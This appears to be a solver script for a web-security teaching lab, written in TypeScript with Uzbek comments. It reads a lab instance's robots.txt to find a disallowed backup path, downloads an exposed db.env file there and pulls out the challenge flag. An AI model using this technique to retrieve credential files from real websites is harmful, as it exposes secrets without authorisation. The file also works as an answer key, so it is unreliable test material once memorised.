/**
 * Yechim izohi:
 * Talaba /robots.txt faylini tekshirib, undagi taqiqlangan yo'lni ('/.backup_secrets_2026/') topadi.
 * Ushbu yo'ldagi ochiq qoldirilgan db.env konfiguratsiya faylini yuklab, FLAG_PRODUCTION qiymatini oladi.
 */
import { withWebLabInstance, extractFlagFromText } from "./solver-utils";

export async function solve(options?: { userId?: string }): Promise<string> {
  const userId = options?.userId || "student_solver_test";

  return withWebLabInstance("web-exposed-files", userId, async (baseUrl) => {
    // 1. robots.txt ni tekshirish
    const robotsRes = await fetch(`${baseUrl}/robots.txt`);
    const robotsText = await robotsRes.text();
    if (!robotsText.includes("/.backup_secrets_2026/")) {
      throw new Error("web-exposed-files: robots.txt da backup papka topilmadi");
    }

    // 2. Ochiq qoldirilgan konfiguratsiya faylini o'qish
    const envRes = await fetch(`${baseUrl}/.backup_secrets_2026/db.env`);
    const envText = await envRes.text();
    const flag = extractFlagFromText(envText);
    if (!flag) throw new Error("web-exposed-files: db.env faylidan flag topilmadi");
    return flag;
  });
}

if (require.main === module) {
  solve().then((f) => console.log("[SOLVER SUCCESS] web-exposed-files flag:", f));
}
